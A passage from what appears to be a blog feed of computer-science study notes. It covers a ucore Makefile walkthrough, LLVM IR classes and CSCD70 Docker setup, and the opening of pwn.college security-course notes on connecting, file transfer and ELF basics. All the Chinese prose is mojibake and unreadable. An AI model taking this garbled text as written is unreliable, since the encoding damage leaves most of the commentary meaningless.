$(1)</span>) $(3) -c $<span class="hljs-variable">$&lt;</span> -o $<span class="hljs-variable">$@</span><br>ALLOBJS += $<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)<br>))<br>= <span class="hljs-variable">$(<span class="hljs-built_in">eval</span></span><br><span class="hljs-variable">$(<span class="hljs-built_in">call</span> todep, $(1)</span>, $(4))): $(1) | $$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>)  $(3) -MM <span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$(patsubst %.d,%.o,<span class="hljs-variable">$@</span>) <span class="hljs-variable">$@</span>&quot;</span>&gt; <span class="hljs-variable">$@</span><br><span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @echo + cc <span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c <span class="hljs-variable">$&lt;</span> -o <span class="hljs-variable">$@</span><br>ALLOBJS += <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4))<br>)<br>= <span class="hljs-variable">$(<span class="hljs-built_in">eval</span></span><br><span class="hljs-variable">obj/main.d: main.c | $$$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @gcc -I./ -Wall -MM main.c -MT <span class="hljs-string">&quot;main.o main.d&quot;</span>&gt; main.d<br><span class="hljs-section">obj/main.o: main.c | $$$(dir $<span class="hljs-variable">$@</span>)</span><br>    @echo + cc main.c<br>    <span class="hljs-variable">$(V)</span>gcc -I./ -Wall -c main.c -o main.o<br>)<br><span class="hljs-comment"># æ³¨æ„åˆ°è¿˜æœ‰ä¸€æ¬¡expansion, æ˜¯å› ä¸º .SECONDEXPANSION: è¿™ä¸ªbuilt-in target</span><br>=<br><span class="hljs-section">obj/main.d: main.c | obj</span><br>    @gcc -I./ -Wall -MM main.c -MT <span class="hljs-string">&quot;main.o main.d&quot;</span>&gt; main.d <br><span class="hljs-section">obj/main.o: main.c | obj</span><br>    @echo + cc main.c<br>    <span class="hljs-variable">$(V)</span>gcc -I./ -Wall -c main.c -o main.o<br></code></pre></div></td></tr></table></figure><p>è‡³æ­¤é€šè¿‡ä¾‹å­æ¼”ç¤ºäº†å¦‚æœä½¿ç”¨Makefileæ¥ç”Ÿæˆä¸€ç³»åˆ—ç¼–è¯‘è§„åˆ™ï¼Œå¦‚æœä½¿ç”¨<code>make --trace</code>(æ‰€æœ‰è¾“å‡º)æˆ–è€…<code>make -n</code>(Donâ€™t actually run any recipe; just print them.)ï¼Œå¯ä»¥å‘ç°ç”Ÿæˆobj/boot/bootasm.d, obj/boot/bootasm.oçš„å®é™…æ‰§è¡Œçš„å‘½ä»¤ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -MM boot/bootmain.c -MT &quot;obj/boot/bootmain.o obj/boot/bootmain.d&quot;&gt; obj/boot/bootmain.d<br>å’Œ:<br>gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o<br></code></pre></div></td></tr></table></figure><p>ï¼Œä¸ä¸Šè¿°ä¾‹å­ä¸­å±•å¼€çš„ç»“æœè¿›è¡Œå¯¹æ¯”ï¼Œå¯ä»¥ç¡®è®¤è¯¥åˆ†æè¿‡ç¨‹çš„æ­£ç¡®æ€§ï¼›</p><ul><li>å…¶ä½™Makefileå‘½ä»¤å‡ç”¨äºç”Ÿæˆ<code>.PHONY</code>ç›®æ ‡æ¥å®Œæˆcleanï¼Œgradeç­‰ä¸€ç³»åˆ—åŠŸèƒ½ï¼Œä¸å…·ä½“ç”Ÿæˆucore.imgè¿‡ç¨‹æ— å…³ï¼Œå› æ­¤åœ¨æœ¬æŠ¥å‘Šä¸­å°†ä¸å¤ªå¯¹å…¶è¿›è¡Œåˆ†æï¼›</li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSCD70 &amp;&amp; LLVM</title>
    <link href="/2022-03/Now-CSCD70/"/>
    <url>/2022-03/Now-CSCD70/</url>
    
    <content type="html"><![CDATA[<h1 id="dockerç›¸å…³"><a href="#dockerç›¸å…³" class="headerlink" title="dockerç›¸å…³"></a>dockerç›¸å…³</h1><blockquote><p>dockeråŸç†å¾…çœ‹, ä¸»è¦æ˜¯chroot+namespaceçš„ä½¿ç”¨, æ‰€ä»¥åªèƒ½åœ¨linuxä¸­è¿è¡Œ. Windowså¿…é¡»è£…ä¸ŠWSL.</p></blockquote><ul><li>å¼€å¯container</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd ~/Desktop/CSCD70/<br>sudo docker run -it -v $(pwd):/mnt --rm --name cscd70_a1 cscd70:2021S<br></code></pre></div></td></tr></table></figure><ul><li>å¤šå¼€container: </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo docker exec -it <br>sudo docker exec -it &#123;container_ID&#125; /bin/bash <br><span class="hljs-meta">#</span><span class="bash"> ä¸€é•¿ä¸²çš„æ˜¯container ID, å¯ä»¥ç›´æ¥çœ‹å®¹å™¨ç”¨æˆ·å, æˆ–è€…ä½¿ç”¨`sudo docker ps`</span><br></code></pre></div></td></tr></table></figure><ul><li>å…·ä½“åˆ›å»ºæ–¹æ³•åœ¨Assignment0é‡Œé¢, æˆ‘è¿˜ä¸ºæ­¤æ¢äº†ä¸ªé˜¿é‡Œæºâ€¦ ä¸‹é¢æ˜¯dockerfileæ–°åŠ ä¸Šçš„éƒ¨åˆ†.</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse&quot;</span> &gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br></code></pre></div></td></tr></table></figure><h1 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h1><h2 id="CLI-Guide"><a href="#CLI-Guide" class="headerlink" title="CLI Guide"></a>CLI Guide</h2><ul><li>-load: load additional library    -{pass_name}    ./test/Loop.c: <strong>check file(expected)</strong>    stdin of FileCheck: <strong>input file</strong><br>  if correct, nothing will be printed.<br>  éœ€è¦å…ˆåœ¨FunctionInfoæ–‡ä»¶å¤¹æ‰§è¡Œmake.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">opt -load ./FunctionInfo.so -function-info ./test/Loop.bc \<br>-disable-output | FileCheck --check-prefix=SAMPLE ./test/Loop.c<br></code></pre></div></td></tr></table></figure><h2 id="Code-Representation-IR"><a href="#Code-Representation-IR" class="headerlink" title="Code Representation: IR"></a>Code Representation: IR</h2><ul><li>LLVM is strongly typed with a simple type system. such as <code>i32</code> type.</li><li>the calling convention is abstracted through <code>call</code> and <code>ret</code> instructions and explicit arguments</li><li> it uses <strong>an infinite set of temporaries</strong> named with a % character instead of specific named registers. </li><li>LLVM IR is actually defined in <strong>three</strong> isomorphic forms: the <strong>textual</strong> format above, an <strong>in-memory data structure</strong> inspected and modified by optimizations themselves, and an efficient and dense on-disk binary â€œ<strong>bitcode</strong>â€œ format.<ul><li><code>.bc</code> is bitcode, <code>.ll</code> is textual format.</li></ul></li><li></li></ul><h2 id="Class-Architecture"><a href="#Class-Architecture" class="headerlink" title="Class Architecture"></a>Class Architecture</h2><h3 id="IRæ‰€æœ‰å¤´æ–‡ä»¶"><a href="#IRæ‰€æœ‰å¤´æ–‡ä»¶" class="headerlink" title="IRæ‰€æœ‰å¤´æ–‡ä»¶"></a><a href="https://llvm.org/doxygen/dir_c3e93f23a4a31c717998b98ce143b7c0.html">IRæ‰€æœ‰å¤´æ–‡ä»¶</a></h3><h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-value-class">Value</a></h3><p>å°±å’Œåå­—ä¸€ä¸ªæ„æ€, It represents a typed value that may be used (among other things) as an operand to an instruction. To keep track of this relationship, the <code>Value</code> class keeps a list of all of the <code>User</code>s that is using it( å°±æ˜¯<code>Use *UseList;</code>)</p><p>æœ‰ä¸€äº›getType, getValue, use_list_iteratorä¹‹ç±»çš„æˆå‘˜å‡½æ•°.</p><img src="../../image/CSCD70/image-20220315181757882.png" alt="image-20220315181757882" style="zoom: 80%;" /><h3 id="BB"><a href="#BB" class="headerlink" title="BB"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-basicblock-class">BB</a></h3><p>æ²¡å•¥å¥½è¯´çš„. æŸ¥å°±å®Œäº‹äº†.</p><h3 id="User"><a href="#User" class="headerlink" title="User!!!"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-user-class">User</a>!!!</h3><p>It exposes a list of â€œOperandsâ€ that are all of the <code>Value</code>s that the User is referring to.</p><p>Because LLVM uses <strong>Static Single Assignment (SSA)</strong> form, there can only be one definition referred to, allowing this direct connection. This connection provides the use-def information in LLVM. çœŸå·§, å› ä¸ºé‡‡ç”¨äº†SSAæ‰€ä»¥å®ç°äº†ä¸€ä¸€å¯¹åº”çš„æŒ‡é’ˆ.</p><p>æœ‰ä¸€äº›<code>getOperand</code>, <code>getNumOperands</code>ä¹‹ç±»çš„å‡½æ•°(æ˜¾è€Œæ˜“è§äº†). åƒè¿™ç§çš„éƒ½ä¼šæœ‰è¿­ä»£å™¨.</p><p>æ´¾ç”Ÿç±»åŒ…æ‹¬==Constant, Instruction, Operator==ä¹‹ç±»çš„(å› inst operatoræœ‰å¾ˆå¤šç§å­ç±»æ‰€ä»¥å›¾ç‰‡è¿‡é•¿).</p><p><strong>å‡ ä¸ªé‡è¦çš„é—®é¢˜: Userä¸ºä»€ä¹ˆç»§æ‰¿äºValue? Userå’ŒUseæœ‰ä»€ä¹ˆå…³ç³»?</strong> </p><ul><li><p>ç¬¬ä¸€ä¸ªé—®é¢˜, æ¯”å¦‚è¯´Instruction class(å‡è®¾æ˜¯<code>%add1 : x = y + z</code>)ç»§æ‰¿é“¾ä¸º<code>Value&lt;-User&lt;-Instruction</code>, æ—¢æœ‰valueçš„definition(x), ä¹Ÿæœ‰use(yå’Œz). </p><p><code>replaceAllUsesWith()</code>æ˜¯Valueçš„method, æ›¿æ¢æ‰æ‰€æœ‰å¼•ç”¨xçš„use, å³def-use chain;<br><code>replaceUsesOfWith()</code>æ˜¯Userçš„method, æ›¿æ¢y, zæ‰€æŒ‡å‘çš„value, å³use-def chain(ç”±äºSSAæ‰€ä»¥å¯ä»¥å®ç°ä¸€ä¸€å¯¹åº”).</p></li><li><p>ç¬¬äºŒä¸ª, LLVMçš„<a href="https://llvm.org/docs/ProgrammersManual.html#interaction-and-relationship-between-user-and-use-objects">doc</a>å’Œ<a href="https://stackoverflow.com/questions/35370195/llvm-difference-between-uses-and-user-in-instruction-or-value-classes">Stack Overflow</a>æœ‰ç›¸å…³è§£é‡Š. (Use s will <code>inline</code> or <code>hung off</code>)ä¸‹é¢è¿™ç§æƒ…å†µå°±æ˜¯hung off, <code>use**</code>æ•°ç»„é€šè¿‡é‡å†™operator newçš„æ–¹å¼é™„åŠ åœ¨User classå‰é¢. è€Œåœ¨Value classä¸­åˆ™æœ‰<code>Use *UseList;</code> , æ‰€ä»¥åœ¨Userä¸­ä¹Ÿæœ‰uselist.</p><p>åœ¨Use classä¸­, Valueå’ŒUseréƒ½ä½œä¸ºfriend class.</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...---.---.---.---.-------...<br>  | P | P | P | P | User<br><span class="hljs-string">&#x27;&#x27;&#x27;---&#x27;---&#x27;---&#x27;---&#x27;-------&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a><a href="https://llvm.org/doxygen/classllvm_1_1Instruction.html">Instruction</a></h3><p>çœŸçš„æ˜¯ä¸€å †æ´¾ç”Ÿç±».</p><p>To represent a specific type of instruction, one of many subclasses of <code>Instruction</code> are used. çœŸçš„éå¸¸å¤š, æ¯”å¦‚è¯´äºŒå…ƒè¿ç®—ç¬¦å’ŒUnaryInstruction(åˆåˆ†æˆUnaryOperatorå’ŒLoadInstructionä¹‹ç±»çš„).</p><p>ç»§æ‰¿å›¾: Value&lt;(ç»§æ‰¿è‡ª)-User&lt;-Instruction</p><p><strong>å†™ä¸ªä»£ç åˆå‘ç°ä¹‹å‰çœ‹æ–‡æ¡£æ²¡çœ‹æ‡‚çš„åœ°æ–¹(è¿˜æ˜¯å¾—æ‹¿æºç å‡ºæ¥)</strong> </p><p><a href="https://github.com/llvm/llvm-project/blob/main/llvm/include/llvm/IR/Instruction.def#L126"><code>llvm/Instruction.def</code></a> file. This file contains some meta-data about <strong>the various different types</strong> of instructions in LLVM. </p><p>åœ¨instruction.hä¸­æœ‰ä¸‹é¢è¿™ä¸ªenum, è€ŒInstruction.defä¸­æ˜¯ä¸€å¤§ä¸²æ²¡æœ‰å®ä¾‹åŒ–çš„#define, åœ¨enumä¸­å®ä¾‹åŒ–æ‰€éœ€çš„æ“ä½œåincludeé‚£ä¸ªæ–‡ä»¶å°±å¯ä»¥å®ç°åœ¨enumé‡Œé¢é€šè¿‡é¢„å¤„ç†åæ˜¾ç¤º<code>ADD = 13(å³ OPC = N )</code>äº†. ä¸è¿‡è¿™ç§å†™æ³•doxygenå¹¶ä¸èƒ½è¯†åˆ«å‡ºæ¥.</p><p>å†™æˆ <code>Instruction::ADD</code> å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæšä¸¾å˜é‡äº†.</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Instruction</span> :</span> ... &#123; ...<br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BinaryOps</span> &#123;</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  FIRST_BINARY_INST(N)             BinaryOpsBegin = N,</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HANDLE_BINARY_INST(N, OPC, CLASS) OPC = N,</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>   LAST_BINARY_INST(N)             BinaryOpsEnd = N+1</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/IR/Instruction.def&quot;</span></span><br>  &#125;;<br>  ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h3><p>Constant represents a base class for different types of constants.</p><p>It is subclassed by <strong>ConstantInt</strong>, <strong>ConstantArray</strong>, etc. for representing the various types of Constants. </p><p>æˆå‘˜å‡½æ•°æœ‰æ¯”å¦‚getSExtValueè¿™æ ·çš„, è¿˜æœ‰ä¸ªgetSignedé™æ€æˆå‘˜å‡½æ•°ç­‰ç­‰.</p><img src="../../image/CSCD70/image-20220317122408594.png" alt="image-20220317122408594" style="zoom:67%;" /><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-function-class">Function</a></h3><img src="../../image/CSCD70/image-20220315185203276.png" alt="image-20220315185203276" style="zoom:67%;" /><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><p>Every <code>Value</code> has a <code>Type</code>. æœ‰ä¸€ä¸ª<code>SubClassData</code>å¯ä»¥åœ¨æ´¾ç”Ÿç±»ä¸­å­˜å‚¨æ•°æ®, ä½¿ç”¨<code>Type class</code>ä¸­çš„<code>set~()</code>å³å¯è®¾ç½®.</p><p>æœ‰ä¸€ä¸ªæˆ‘æŸ¥äº†æŒºä¹…çš„é—®é¢˜: <strong>Functionå’ŒFunctionTypeæœ‰ä»€ä¹ˆåŒºåˆ«?</strong> </p><ul><li>The <code>Function</code> class keeps track of a <strong>list</strong> of <a href="https://llvm.org/docs/ProgrammersManual.html#basicblock">BasicBlock</a>s, a <strong>list</strong> of formal <a href="https://llvm.org/docs/ProgrammersManual.html#argument">Argument</a>s, and a <a href="https://llvm.org/docs/ProgrammersManual.html#symboltable">SymbolTable</a>.<br>æœ‰åƒgetArgumentListè¿™æ ·çš„å‡½æ•°. åŸºæœ¬éƒ½æ˜¯å­˜å‚¨ä¸€ä¸ªlistçš„ä¿¡æ¯.</li><li>è€ŒFunctionTypeçš„åŠŸèƒ½å°±åƒä¸‹é¢æ‰€å±•ç¤ºçš„é‚£æ ·, å­˜å‚¨ç€ç¼–ç¨‹å±‚é¢ä¸Š/ä¸€ä¸ªå‡½æ•°çš„åŸºæœ¬ä¿¡æ¯. </li></ul><blockquote><p>**FunctionType: ** </p><p>Subclass of DerivedTypes for function types.</p><ul><li><code>bool isVarArg() const</code>: Returns true if itâ€™s a vararg function.</li><li><code>const Type * getReturnType() const</code>: Returns the return type of the function.</li><li><code>const Type * getParamType (unsigned i)</code>: Returns the type of the ith parameter.</li><li><code>const unsigned getNumParams() const</code>: Returns the number of formal parameters.</li></ul></blockquote><img src="../../image/CSCD70/image-20220315183948503.png" alt="image-20220315183948503" style="zoom:67%;" /><h1 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h1><blockquote><p>å‚è€ƒåšå®¢<a href="https://kiprey.github.io/2020/06/LLVM-IR-pass/#4-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%9A%84%E4%BC%98%E5%8C%96">åœ¨æ­¤</a>, å³åŸºæœ¬æ¦‚å¿µ+LLVMå®ä¾‹.</p></blockquote><h2 id="Assignment1"><a href="#Assignment1" class="headerlink" title="Assignment1"></a>Assignment1</h2><p>ç¯å¢ƒè°ƒæ•´:</p><ul><li> ä¸çŸ¥é“å“ªä¸ªlitæ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿, è£…åœ¨äº†pythonæ¨¡å—é‡Œé¢ä½†æ˜¯åˆå¥½åƒæ˜¯llvm-lit, æ˜æ˜çœ‹åˆ°äº†è¿™ä¸ªå‘½ä»¤ä½†æ˜¯è£…ä¸Šäº†llvmä¹Ÿæ²¡è§åˆ°. æ¯ç­å§, ä¸ç”¨è¿™ä¸ªä»€ä¹ˆæµ‹è¯•äº†. å¥½å§<code>pip install lit</code>å°±æˆåŠŸäº†. å’Œæˆ‘è¿™ä¸¤ä¸ªç”¨æˆ·å…±äº«åŒä¸€ä¸ªhomeæ–‡ä»¶å¤¹æœ‰å…³ç³». </li><li>ç›´æ¥make testæ£€æŸ¥çš„æ˜¯<code>.ll</code>, éš¾æ€ªé€šè¿‡ä¸äº†, ç›´æ¥ä½¿ç”¨FileCheckä½¿ç”¨çš„æ˜¯<code>.c</code>ä¸­çš„CHECK. ä½†æ˜¯Function Informationä»»åŠ¡ç»“æœå’ŒCHECHä¸­çš„æ˜æ˜¾ä¸åŒ, è‡ªç„¶ä¸ä¼šæˆåŠŸ. </li><li>ctestæ˜¯cmakeä½¿ç”¨çš„test suit. litæ˜¯llvmçš„test suit. </li><li>FunctionInfoå’ŒLocalOptè¦<strong>ä½œä¸ºä¸¤ä¸ªæ–‡ä»¶å¤¹æ‰“å¼€</strong>æ‰ä¼šæœ‰æ™ºèƒ½è¡¥å…¨. </li><li></li></ul><p>Assignment: </p><ul><li>(1) Algebraic Identity</li><li>(2) Strength Reduction</li><li>(3) Multi-Instruction Optimization</li></ul><p>ç»è¿‡åœ¨æ–‡æ¡£é‡Œçš„ä¸€ç•ªå€’è…¾ç»ˆäºä¼šäº†ä¸€äº›åŸºæœ¬æ“ä½œ, <code>dyn_cast</code> <code>replaceAllUsesWith</code> <code>getOperand</code> è¿™äº›ä¸œè¥¿ç­‰ç­‰.</p><h2 id="Assignment2"><a href="#Assignment2" class="headerlink" title="Assignment2"></a>Assignment2</h2><ul><li>åˆ°è¾¾-å®šå€¼åˆ†æï¼ˆReaching-Definition Analysis)</li><li>æ´»è·ƒå˜é‡åˆ†æï¼ˆLive-Variable Analysis)</li><li>å¯ç”¨è¡¨è¾¾å¼åˆ†æ (Available-Exprssion Analysis)</li><li>SSA ( static single assignment )</li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn modulesçš„ä¸€ç‚¹ç¬”è®°</title>
    <link href="/2022-01/Now-pwn-modules/"/>
    <url>/2022-01/Now-pwn-modules/</url>
    
    <content type="html"><![CDATA[<ul><li><p>è¿æ¥</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li><li><p>ä¼ æ–‡ä»¶åˆ°dojoæˆ–æ‹‰å–</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [æ–‡ä»¶] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[æ–‡ä»¶] ./<br></code></pre></div></td></tr></table></figure></li><li><p><strong>å¯ä»¥åˆ›å»ºflagçš„ç¬¦å·é“¾æ¥, ä¸è¿‡é™¤äº†$HOMEå…¶ä»–ç›®å½•å‡ä¸èƒ½å†™, åªèƒ½åœ¨<code>~/</code>ä¸‹.</strong> </p></li></ul><h1 id="module-1-communication"><a href="#module-1-communication" class="headerlink" title="module 1-communication"></a>module 1-communication</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" alt="image-20220117165401525"></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure><h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote><p>æ•™ç¨‹è¿˜æ˜¯æŒºç»çš„, slideå¯ä»¥åšä¸ºåŸºç¡€çŸ¥è¯†çš„è¯¦ç»†å‚è€ƒèµ„æ–™. Binaryfilesçš„slideåœ¨<a href="https://docs.google.com/presentation/d/1wrX8tvwaxIEk5hx4OtQmPqps-MScIaDO-9bTKQqr8vI/edit#slide=id.g9265d66f8d_0_26">è¿™é‡Œ</a> </p><p><a href="https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">ELF base struct: header-sections-segments</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/">symbols</a><br><a href="https://www.intezer.com/blog/elf/executable-and-linkable-format-101-part-3-relocations/">relocations</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">dynamic-linking</a> </p></blockquote><ul><li>ELF is a binary file format.<br>  Contains the program and its data.Describes how the program should be loaded (<em>program/segment headers</em>).Contains metadata describing program components (<em>section headers</em>).</li><li><strong>sections</strong> gather all needed information to link a given object file and build an executable,<br>  while <strong>Program Headers</strong> split the executable into segments with different attributes, which will eventually be loaded into memory.</li><li>Section headers are <em><strong>not</strong></em> a necessary part of the ELF. <em>Section headers</em> are just <strong>metadata</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file /bin/cat</span> <br>/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e6afa43e1e280bd06c018f541c7ae46a2ebda83c, for GNU/Linux 3.2.0, stripped<br></code></pre></div></td></tr></table></figure><ul><li>Several ways to dig in: åœ¨CSAPPé‡Œ, å½“åˆçœ‹çš„æ—¶å€™è¢«æˆ‘å¿½ç•¥æ‰äº†â€¦<ul><li><input checked="" disabled="" type="checkbox"> <strong>gcc</strong> to make your ELF.</li><li><input checked="" disabled="" type="checkbox"> <strong>readelf</strong> to parse the ELF header.</li><li><input checked="" disabled="" type="checkbox"> <strong>objdump</strong> to parse the ELF header and disassemble the source code.</li><li><input checked="" disabled="" type="checkbox"> <strong>nm</strong> to view your ELFâ€™s symbols.</li><li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some 